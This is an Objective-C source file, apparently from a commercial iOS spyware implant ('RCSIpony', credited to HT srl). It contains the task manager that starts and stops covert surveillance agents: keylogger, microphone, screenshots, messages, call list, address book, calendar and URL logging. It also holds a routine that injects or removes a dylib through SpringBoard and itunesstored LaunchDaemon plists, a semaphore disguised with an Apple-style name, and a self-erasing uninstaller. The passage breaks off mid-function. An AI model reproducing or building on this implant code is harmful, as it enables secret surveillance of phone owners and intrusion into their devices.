/*
 * RCSIpony - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <semaphore.h>

#import "RCSIAgentCalendar.h"
#import "RCSIAgentAddressBook.h"
#import "RCSIAgentMicrophone.h"
#import "RCSIAgentPosition.h"
#import "RCSIAgentMessages.h"
#import "RCSIAgentDevice.h"
#import "RCSIAgentCallList.h"
#import "RCSIInfoManager.h"

#import "NSMutableDictionary+ThreadSafe.h"
#import "RCSISharedMemory.h"
#import "RCSITaskManager.h"
#import "RCSIConfManager.h"
#import "RCSILogManager.h"
#import "RCSIActions.h"
#import "RCSIEvents.h"
#import "RCSICommon.h"
#import "RCSINotificationSupport.h"

//#define DEBUG
//#define NO_START_AT_LAUNCH
#define SEM_NAME            "com.apple.mdworker_executed"


static NSLock *gTaskManagerLock             = nil;
static RCSITaskManager  *sharedTaskManager  = nil;
extern RCSISharedMemory *mSharedMemoryCommand;

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSITaskManager

@synthesize mEventsList;
@synthesize mActionsList;
@synthesize mAgentsList;
@synthesize mGlobalConfiguration;
@synthesize mBackdoorControlFlag;
@synthesize mShouldReloadConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSITaskManager *)sharedInstance
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedTaskManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        sharedTaskManager = [super allocWithZone: aZone];
      
        //
        // Assignment and return on first allocation
        //
        return sharedTaskManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedTaskManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mEventsList   = [[NSMutableArray alloc] init];
              mActionsList  = [[NSMutableArray alloc] init];
              mAgentsList   = [[NSMutableArray alloc] init];
              
              mShouldReloadConfiguration = FALSE;
            
              mConfigManager = [[RCSIConfManager alloc] initWithBackdoorName:
                                [[[NSBundle mainBundle] executablePath] lastPathComponent]];
              
              //[mConfigManager setDelegate: self];
              mActions = [[RCSIActions alloc] init];
              
              mSharedMemory = mSharedMemoryCommand;
              
              sharedTaskManager = self;
            }
          
          //[mConfigManager release];
        }
    }
  
  return sharedTaskManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Generic backdoor operations
#pragma mark -

- (BOOL)loadInitialConfiguration
{
  if ([mConfigManager loadConfiguration] == YES)
    {
      //
      // Start all the enabled agents
      //
//#ifndef NO_START_AT_LAUNCH
      [self startAgents];
//#endif
      
      //
      // Start events monitoring thread
      //
      [NSThread detachNewThreadSelector: @selector(eventsMonitor)
                               toTarget: self
                             withObject: nil];
    }
  else
    {
      // TODO: Load default configuration
#ifdef DEBUG
      NSLog(@"An error occurred while loading the configuration file");
#endif
      exit(-1);
    }
  
  return TRUE;
}

- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
{
#ifdef DEBUG_CONF_MANAGER
  NSLog(@"Writing the new configuration");
#endif
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: gConfigurationUpdateName] == TRUE)
    {
#ifdef DEBUG_CONF_MANAGER
      NSLog(@"updateConfiguration: removing old config file");
#endif
      NSError *rmErr;
      
      if (![[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName error: &rmErr])
      {
#ifdef DEBUG_CONF_MANAGER
        infoLog(@"Error remove file configuration %@", rmErr);
#endif
      }
    }
  
  if ([aConfigurationData writeToFile: gConfigurationUpdateName
                       atomically: YES])
  {
#ifdef DEBUG_CONF_MANAGER
    infoLog(@"file configuration write correctly");
#endif
  }
  else
  {
#ifdef DEBUG_CONF_MANAGER
    infoLog(@"Error writing file configuration");
#endif
  }
  
  if ([mConfigManager checkConfigurationIntegrity: gConfigurationUpdateName])
    {
      //
      // If we're here it means that the file is ok thus it is safe to replace
      // the original one
      //
      if ([[NSFileManager defaultManager] removeItemAtPath: gConfigurationName
                                                     error: nil])
        {
          if ([[NSFileManager defaultManager] moveItemAtPath: gConfigurationUpdateName
                                                      toPath: gConfigurationName
                                                       error: nil])
            {
#ifdef DEBUG_CONF_MANAGER
              infoLog(@"moving new file configuration");
#endif
              mShouldReloadConfiguration = YES;
              return TRUE;
            }
        }
    }
  else
    {
      [[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName
                                                 error: nil];
#ifdef DEBUG_CONF_MANAGER
      infoLog(@"Error moving new file configuration");
#endif
      
      RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
      [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
      [infoManager release];
    }
  
  return FALSE;
}

- (BOOL)reloadConfiguration
{
  if (mShouldReloadConfiguration == YES) 
    {
      mShouldReloadConfiguration = NO;
    
      //
      // Now stop all the agents and reload configuration
      //
      if ([self stopEvents] == TRUE)
        {
#ifdef DEBUG
          NSLog(@"[reloadConfiguration] Events stopped correctly");
#endif
          
          if ([self stopAgents] == TRUE)
            {
#ifdef DEBUG
              NSLog(@"[reloadConfiguration] Agents stopped correctly");
#endif
              
              //
              // Now reload configuration
              //
              if ([mConfigManager loadConfiguration] == YES)
                {
                  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
                  [infoManager logActionWithDescription: @"New configuration activated"];
                  [infoManager release];

                  //
                  // Start agents
                  //
                  [self startAgents];
                  
                  //
                  // Start event thread here
                  //
                  [self eventsMonitor];
                }
              else
                {
                  // previous one
#ifdef DEBUG
                  NSLog(@"[reloadConfiguration] An error occurred while reloading the configuration file");
#endif
                  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
                  [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
                  [infoManager release];

                  return NO;
                }
            }
        }
    }
  
  return YES;
}

- (void)uninstallMeh
{
  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
  NSMutableData *uninstCommand;
  
  if ([self stopEvents] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"Events stopped correctly");
#endif
      
      if ([self stopAgents] == TRUE)
        {
#ifdef DEBUG
          NSLog(@"Agents stopped correctly");
#endif
          
          //
          // Remove all the external files (LaunchDaemon plist/SLI plist)
          //
          NSString *ourPlist = BACKDOOR_DAEMON_PLIST;          
          [[NSFileManager defaultManager] removeItemAtPath: ourPlist
                                                     error: nil];

          // Remove the entry in SB plists 
          removeDylib(sbPathname);
        
          // unload envs by dylib
          uninstCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[uninstCommand bytes];
          shMemoryHeader->agentID         = OFFT_UNINSTALL;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_UNINSTALL;
          shMemoryHeader->commandDataSize = [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding];
        
          memcpy(shMemoryHeader->commandData, 
                 [[gDylibName dataUsingEncoding: NSASCIIStringEncoding] bytes], 
                 [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);
        
#ifdef DEBUG
          NSLog(@"%s: sending uninstall command to dylib %@", __FUNCTION__, gDylibName);
#endif
        
          if ([mSharedMemory writeMemory: uninstCommand
                                  offset: OFFT_UNINSTALL
                           fromComponent: COMP_CORE])
            {
#ifdef DEBUG
              NSLog(@"%s: sending uninstall command to dylib: done!", __FUNCTION__);
#endif
            }
          else 
            {
#ifdef DEBUG
              NSLog(@"%s: sending uninstall command to dylib: error!", __FUNCTION__);
#endif
            }
          
          [uninstCommand release];
        
          // remove envs from itunes
          removeDylib(itPathname);
        
          // restart services
          system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\";" 
                 "launchctl load \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
          
          // finally remove the dylib
          NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];;          
          [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                                   error: nil];
          [dylibPathname release];
        
          //
          // Remove our working dir
          //
          if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                                         error: nil])
            {
#ifdef DEBUG
              NSLog(@"Backdoor dir removed correctly");
#endif
            }
          else
            {
#ifdef DEBUG
              NSLog(@"An error occurred while removing backdoor dir");
#endif
            }

          //
          // Unlinking semaphore
          //
          if (sem_unlink(SEM_NAME) == 0)
            {
#ifdef DEBUG
              NSLog(@"sem_unlink went ok");
#endif
            }
          else
            {
#ifdef DEBUG
              NSLog(@"An error occurred while unlinking semaphore");
#endif
            }

          pid_t pid = fork();
          if (pid == 0) 
            {
              execlp("/bin/launchctl",
                     "/bin/launchctl",
                     "remove",
                     [[[ourPlist lastPathComponent] stringByDeletingPathExtension] UTF8String],
                     NULL);
            }
          
          int status;
          waitpid(pid, &status, 0);
          
          //
          // And now exit
          //
          exit(0);
        }
    }
}

#pragma mark -
#pragma mark Agents
#pragma mark -

- (id)initAgent: (u_int)agentID
{
  return nil;
}

- (BOOL)startAgent: (u_int)agentID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
  NSMutableDictionary *agentConfiguration;
  NSData *agentCommand;
  
  switch (agentID)
    {
    case AGENT_SCREENSHOT:
      {
#ifdef DEBUG
        NSLog(@"%s: Starting Agent Screenshot", __FUNCTION__);
#endif
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
      
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = [agentConf length];
            
            memcpy(shMemoryHeader->commandData, 
                   [agentConf bytes], 
                   [agentConf length]);
#ifdef DEBUG
            NSLog(@"%s: Starting remote Screenshot Agent", __FUNCTION__);
#endif
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_SCREENSHOT
                             fromComponent: COMP_CORE])
              {
                [agentConfiguration setObject: AGENT_RUNNING
                                       forKey: @"status"];
              }
          
            [agentConfiguration release];
            [agentCommand release];
          }
      
        break;
      }        
    case AGENT_MICROPHONE:
      {   
#ifdef DEBUG
        NSLog(@"Starting Agent Microphone");
#endif
        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            
            agentMicrophone.mAgentConfiguration = agentConfiguration;
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentMicrophone
                                   withObject: nil];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"Agent Microphone is already running");
#endif
          }
        break;
      }
    case AGENT_URL:
      {
#ifdef DEBUG
        NSLog(@"%s: Starting Agent URL", __FUNCTION__);
#endif
      
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
            && [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            BOOL success = [_logManager createLog: LOG_URL
                                      agentHeader: nil
                                        withLogID: 0];
            
            if (success == TRUE)
              {
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_URL
                                 fromComponent: COMP_CORE])
                  {
#ifdef DEBUG
                    NSLog(@"%s: Command START sent to Agent URL", __FUNCTION__);
#endif
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
              }
        
            [agentConfiguration release];
            [agentCommand release];
          }
        else
            {
#ifdef DEBUG
              NSLog(@"%s: Agent URL is already running", __FUNCTION__);
#endif
            }
        break;
      }
    case AGENT_APPLICATION:
      {
#ifdef DEBUG
        NSLog(@"%s: Starting Agent Application", __FUNCTION__);
#endif
      
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
            && [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            BOOL success = [_logManager createLog: LOG_APPLICATION
                                      agentHeader: nil
                                        withLogID: 0];
            
            if (success == TRUE)
              {
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_APPLICATION
                                 fromComponent: COMP_CORE])
                  {
#ifdef DEBUG
                    NSLog(@"%s: Command START sent to Agent Application", __FUNCTION__);
#endif
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
              }
        
            [agentConfiguration release];
            [agentCommand release];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"%s: Agent URL is already running", __FUNCTION__);
#endif
          }
      
        break;
      }
    case AGENT_MESSAGES:
      {   
#ifdef DEBUG
        NSLog(@"Starting Agent Messages");
#endif
        RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            
            agentMessages.mAgentConfiguration = agentConfiguration;
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentMessages
                                   withObject: nil];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"Agent Messages is already running");
#endif
          }
        break;
      }
    case AGENT_ORGANIZER:
      {   
#ifdef DEBUG_TMP
        NSLog(@"Starting Agent AddressBook and Calendar");
#endif
        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
                                            
        agentConfiguration = [[self getConfigForAgent: agentID] retain];

        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
#ifdef DEBUG_TMP
            NSLog(@"Starting Agent AddressBook and Calendar: starting new thread");
#endif 
            agentAddress.mAgentConfiguration  = agentConfiguration;
            agentCalendar.mAgentConfiguration = agentConfiguration;
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentAddress
                                   withObject: nil];
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCalendar
                                   withObject: nil];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"Agent AddressBook is already running");
#endif
          }
        break;
      }
    case AGENT_KEYLOG:
      {
#ifdef DEBUG
        NSLog(@"%s: Starting Agent Keylog", __FUNCTION__);
#endif
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
            && [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            BOOL success = [_logManager createLog: LOG_KEYLOG
                                      agentHeader: nil
                                        withLogID: 0];
            
            if (success == TRUE)
              {
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_KEYLOG
                                 fromComponent: COMP_CORE])
                  {
#ifdef DEBUG
                    NSLog(@"%s: Command START sent to Agent Keylog", __FUNCTION__);
#endif
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
              }
        
            [agentConfiguration release];
            [agentCommand release];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"%s: Agent Keylog is already running", __FUNCTION__);
#endif
          }
        break;
      } 
    case AGENT_CRISIS:
      {
#ifdef DEBUG
        NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
#endif
        gAgentCrisis = YES;

        RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
        [infoManager logActionWithDescription: @"Crisis started"];
        [infoManager release];
      
        break;
      } 
    case AGENT_DEVICE:
      {
#ifdef DEBUG
        NSLog(@"Starting Agent Device");
#endif
        RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];

        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];

            agentDevice->mAgentConfiguration = agentConfiguration;

            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentDevice
                                   withObject: nil];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"Agent Device is already running");
#endif
          }
        break;
      }
    case AGENT_CALL_LIST:
      {   
#ifdef DEBUG
        NSLog(@"Starting Agent Call List");
#endif
        RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START
                                   forKey: @"status"];
            
            agentCallList.mAgentConfiguration = agentConfiguration;
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCallList
                                   withObject: nil];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"Agent Messages is already running");
#endif
          }
        break;
      }
    default:
      {
        break;
      }
    }

  //[agentConfiguration release];
  [outerPool release];
  
  return YES;
}

- (BOOL)restartAgent: (u_int)agentID
{
  return YES;
}

- (BOOL)suspendAgent: (u_int)agentID
{
  return YES;
}

- (BOOL)stopAgent: (u_int)agentID
{
  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
  NSMutableDictionary *agentConfiguration;
  NSData *agentCommand;

#ifdef DEBUG
  NSLog(@"Stop Agent called, 0x%4x", agentID);
#endif
  
  switch (agentID)
    {
    case AGENT_SCREENSHOT:
      {
#ifdef DEBUG        
        NSLog(@"Stopping Agent Screenshot");
#endif
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_SCREENSHOT
                         fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG
            NSLog(@"Stop command sent to Agent %x", agentID);
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
      
        [agentCommand release];
      
        break;
      }
    case AGENT_MICROPHONE:
      {
#ifdef DEBUG
        NSLog(@"Stopping Agent Microphone");
#endif
        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
        
        if ([agentMicrophone stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Microphone");
#endif
          }
        else
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
        break;
      }
    case AGENT_URL:
      {
#ifdef DEBUG        
        NSLog(@"Stopping Agent URL");
#endif
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_URL
                         fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG
            NSLog(@"Stop command sent to Agent URL");
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
            [_logManager closeActiveLog: LOG_URL withLogID: 0];
          }
        
        [agentCommand release];
      
        break;
      }
    case AGENT_APPLICATION:
      {
#ifdef DEBUG        
        NSLog(@"Stopping Agent Application");
#endif
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_APPLICATION
                         fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG
            NSLog(@"Stop command sent to Agent Application");
#endif
        
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
            [_logManager closeActiveLog: LOG_APPLICATION withLogID: 0];
          }
      
        [agentCommand release];
      
        break;
      }
    case AGENT_MESSAGES:
      {
#ifdef DEBUG        
        NSLog(@"Stopping Agent Messages");
#endif
        RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
        
        if ([agentMessages stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Messages");
#endif
          }
        else
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
#ifdef DEBUG
        NSLog(@"AgentStatus: %@", [[self getConfigForAgent: AGENT_MESSAGES] objectForKey: @"status"]);
#endif
        
        break;
      }
    case AGENT_ORGANIZER:
      {
#ifdef DEBUG
        NSLog(@"Stopping Agent AddressBook");
#endif
        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
        
        if ([agentAddress stop]  == FALSE ||
            [agentCalendar stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent AddressBook/Calendar");
#endif
          }
        else
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
#ifdef DEBUG      
        NSLog(@"AgentStatus: %@", [[self getConfigForAgent: AGENT_ORGANIZER] objectForKey: @"status"]);
#endif
        break;
      }
    case AGENT_KEYLOG:
      {
#ifdef DEBUG        
        NSLog(@"Stopping Agent Keylog");
#endif
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_KEYLOG
                         fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG
            NSLog(@"Stop command sent to Agent Keylog");
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
            [_logManager closeActiveLog: LOG_KEYLOG withLogID: 0];
          }
      
        [agentCommand release];
      
        break;
      }
    case AGENT_CRISIS:
      {
#ifdef DEBUG
        NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
#endif
        gAgentCrisis = NO;

        RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
        [infoManager logActionWithDescription: @"Crisis stopped"];
        [infoManager release];
      
        break;
      } 
    case LOGTYPE_DEVICE:
      {
#ifdef DEBUG
        NSLog(@"Stopping Agent Device");
#endif
        RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];

        if ([agentDevice stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Device");
#endif
          }
        else
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }

        break;
      }
    case AGENT_CALL_LIST:
      {
#ifdef DEBUG
        NSLog(@"Stopping Agent Call List");
#endif
        RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];

        if ([agentCallList stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Call List");
#endif
          }
        else
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED
                                   forKey: @"status"];
          }
        break;
      }
    default:
      {
        break;
      }
    }
  
  return YES;
}

- (BOOL)startAgents
{
  NSAutoreleasePool   *outerPool    = [[NSAutoreleasePool alloc] init];
  RCSILogManager      *_logManager  = [RCSILogManager sharedInstance];
  
  NSMutableData       *agentCommand;
 
#ifdef DEBUG_TMP
  NSLog(@"Start all Agents called");
#endif
 
  NSMutableDictionary *anObject;
     
  for (anObject in mAgentsList)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      id agentConfiguration        = nil;
      
      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
      NSString *status  = [[NSString alloc] initWithString:
                           [anObject objectForKey: @"status"]];
      
      if ([status isEqualToString: AGENT_ENABLED] == TRUE)
        {
          switch (agentID)
            {
            case AGENT_SCREENSHOT:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent Screenshot", __FUNCTION__);
#endif
              
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG
                    NSLog(@"Config for screenshot not found");
#endif
                    break;
                  }
                else
                  {
                    agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                    
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID         = agentID;
                    shMemoryHeader->direction       = D_TO_AGENT;
                    shMemoryHeader->command         = AG_START;
                    shMemoryHeader->commandDataSize = [agentConfiguration length];
                    
                    memcpy(shMemoryHeader->commandData, 
                           [agentConfiguration bytes], 
                           [agentConfiguration length]);
#ifdef DEBUG
                    NSLog(@"%s: Starting remote Screenshot Agent", __FUNCTION__);
#endif
                  
                    if ([mSharedMemory writeMemory: agentCommand
                                            offset: OFFT_SCREENSHOT
                                     fromComponent: COMP_CORE])
                      {
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];
                      }
                  
                    [agentCommand release];
                  }
              
                break;
              }
            case AGENT_MICROPHONE:
              {
#ifdef DEBUG
                NSLog(@"Starting Agent Microphone");
#endif
                RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG
                    NSLog(@"Config for Mic not found");
#endif
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START forKey: @"status"];
                    agentMicrophone.mAgentConfiguration = anObject;
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMicrophone
                                           withObject: nil];
                  }
                  
                break;
              }
            case AGENT_URL:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent URL", __FUNCTION__);
#endif
                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                    
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                shMemoryHeader->commandDataSize = 0;
                
                BOOL success = [_logManager createLog: LOG_URL
                                          agentHeader: nil
                                            withLogID: 0];
                
                if (success == TRUE)
                  {
                    if ([mSharedMemory writeMemory: agentCommand
                                            offset: OFFT_URL
                                     fromComponent: COMP_CORE])
                      {
#ifdef DEBUG
                        NSLog(@"%s: Command START sent to Agent URL", __FUNCTION__);
#endif
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];
                      }
                  }
                else
                  {
#ifdef DEBUG
                    NSLog(@"An error occurred while creating log for Agent URL");
#endif
                  }
                  
